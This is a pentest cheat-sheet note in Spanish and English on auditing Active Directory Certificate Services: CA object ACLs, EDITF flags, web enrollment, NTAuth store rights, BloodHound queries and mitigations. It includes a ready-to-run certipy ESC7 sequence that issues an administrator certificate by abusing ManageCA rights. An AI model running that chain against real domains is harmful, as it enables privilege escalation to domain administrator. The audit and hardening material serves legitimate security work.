---
aliases:
  - CA ACL Audit
  - Manage CA
  - Manage Certificates
  - EDITF flags
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[AD - ADCS Enumeration]]'
---
# AD - ADCS Enumeration - CA ACL Audit

***

## CA Object DACL

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:CN=<CA-name>,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADRootDSE).rootDomainNamingContext)"` | DACL del CA object | Standard. |
| `Get-CertificationAuthority \| Get-CertificationAuthorityAcl` (PSPKI) | Wrapper | Native. |
| `certipy find -u u -p pass -dc-ip <DC> -text` (incluye CA ACL) | Auto-parsed Linux | Standard. |
| `certutil -getreg policy\EditFlags` (en CA host) | EDITF flags | Local check. |
| `certutil -getreg ca\Security` (en CA host) | Manage CA / Manage Certs ACEs | Local check. |
^ad-caacl-rights

___

## ESC7: Manage CA / Certs

| **Right** | **Qué permite** | **Privesc path** |
|:---:|:---:|:---:|
| `ManageCA` | Modify CA settings (incluye approve/deny) | ESC7 — issue cert via approve. |
| `ManageCertificates` | Approve/deny pending requests | ESC7. |
| Combo (`ManageCA` + `ManageCertificates`) | Full CA control | Direct path. |
^ad-caacl-esc7

```bash
# certipy ESC7 attack
# 1. Create pending request (template requiring approval)
certipy req -u u@corp.local -p pass -ca <CA-name> -template User -upn 'administrator@corp.local'

# 2. Approve as ManageCA (atacante)
certipy ca -u atacante -p pass -ca <CA-name> -issue-request <req-ID>

# 3. Retrieve cert
certipy req -u u@corp.local -p pass -ca <CA-name> -retrieve <req-ID>
```

___

## EDITF Flags Audit

| **Flag** | **Hex** | **Cuándo importa** |
|:---:|:---:|:---:|
| `EDITF_ENABLELDAPREFERRALS` | `0x1` | Default. |
| `EDITF_ENABLECHASEREFERRALS` | `0x2` | Default. |
| `EDITF_ATTRIBUTESUBJECTALTNAME2` | `0x40000` | **CRITICAL — ESC6**: permite SAN injection en cualquier template. |
| `EDITF_DISABLEEXTENSIONLIST` | `0x4000` | Edge. |
| `EDITF_DISABLEDEFAULTPERSIST` | `0x80000` | Edge. |
^ad-caacl-editf

```cmd
:: Audit EDITF flags en CA host
certutil -getreg policy\EditFlags
:: Output incluye EDITF_ATTRIBUTESUBJECTALTNAME2 si seteado

:: Disable ESC6 (priv)
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```

```bash
# Linux check via certipy
certipy find -u u -p pass -dc-ip <DC> -text | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"
```

___

## Web Enrollment ACL

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb <CA-host> -u u -p p` | Banner + signing | Pre-relay. |
| `curl -k https://<CA-host>/certsrv/` | HTTP endpoint accesible | ESC8 surface. |
| `Get-Acl "<IIS-config-path>"` (en CA host) | IIS ACL del cert site | Local audit. |
| `Channel Binding (EPA)` enabled? | Modern hardening | ESC8 mitigation. |
^ad-caacl-webenroll

___

## CA Modification Rights

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `(Get-Acl "AD:<CA-DN>").Access \| ? ActiveDirectoryRights -match "GenericAll\|GenericWrite\|WriteDacl\|WriteOwner"` | Non-default writable | ESC7 surface. |
| `Find-InterestingDomainAcl -ResolveGUIDs \| ? {$_.ObjectDN -match "Public Key Services"}` | Bulk hunt PKI ACEs | Forest-wide. |
^ad-caacl-modify

___

## NTAuthCertificates Modify

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADRootDSE).rootDomainNamingContext)"` | DACL del NTAuth Store | Critical audit. |
| `(Get-Acl ...).Access \| ? ActiveDirectoryRights -match "WriteProperty"` filter en `cACertificate` | WriteProperty cACertificate (add CA) | **CRITICAL**. |
^ad-caacl-ntauth

**Por qué crítico:** WriteProperty `cACertificate` sobre NTAuthCertificates = atacante puede agregar **cualquier CA propio** al NTAuth Store = forest auth bypass via cert emitido por atacante.

```powershell
# Hunt non-default writable NTAuth
Get-Acl "AD:CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,$((Get-ADRootDSE).rootDomainNamingContext)" |
  Select -Expand Access |
  Where {
    $_.AccessControlType -eq "Allow" -and
    $_.IdentityReference -notmatch "BUILTIN|NT AUTHORITY|Domain Admins|Enterprise Admins|SYSTEM" -and
    $_.ActiveDirectoryRights -match "WriteProperty|Generic"
  }
```

___

## Per-CA Configuration

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `certutil -getreg ca\config` (en CA host) | CA config completo | Local audit. |
| `certutil -getreg ca\Security` | DACL Manage CA / Manage Certs | Privesc audit. |
| `certutil -getreg ca\CRLPublicationURLs` | CDP URLs | Adjacent. |
| `certutil -getreg ca\CACertPublicationURLs` | AIA URLs | Adjacent. |
^ad-caacl-config

___

## Authenticated Users / Domain Users

| **Comando** | **Qué detecta** | **Riesgo** |
|:---:|:---:|:---:|
| `(Get-Acl "AD:<CA-DN>").Access \| ? IdentityReference -match "Authenticated Users\|Domain Users"` | Wide ACE en CA | **CRITICAL**. |
| Templates Enroll con Authenticated Users + ESC1-style flags | Universal exploitable | Critical. |
^ad-caacl-authusers

___

## BloodHound CA ACL Edges

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u)-[:Enroll]->(t:CertTemplate) RETURN u,t` | Enroll ACEs | Standard. |
| `MATCH (u)-[:ManageCA\|ManageCertificates]->(c:EnterpriseCA) RETURN u,c` | ESC7 surface | Critical. |
| `MATCH (c:CertTemplate {enrolleeSuppliesSubject:true,hasAuthenticationEKU:true}) RETURN c` | ESC1 templates | Standard. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(d:Domain)) WHERE any(n IN nodes(p) WHERE n:CertTemplate OR n:EnterpriseCA) RETURN p` | Path via ADCS | Privesc. |
^ad-caacl-bh

___

## Mitigations

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2 && net stop certsvc && net start certsvc` | Disable ESC6 | Critical fix. |
| Restrict ManageCA / ManageCertificates a Tier 0 only | Per-CA ACL | Hardening. |
| Restrict templates risky | Remove Authenticated Users de Enroll ACE | Per-template. |
| `certutil -setreg ca\InterfaceFlags +IF_ENFORCEENCRYPTICERTADMIN` | Enforce encryption | Modern. |
| Patch KB5014754 (Certifried) | StrongCertificateBindingEnforcement | Modern auth. |
| Quarterly `certipy find -vulnerable` | Compliance | Trimestral. |
^ad-caacl-mitigations

***
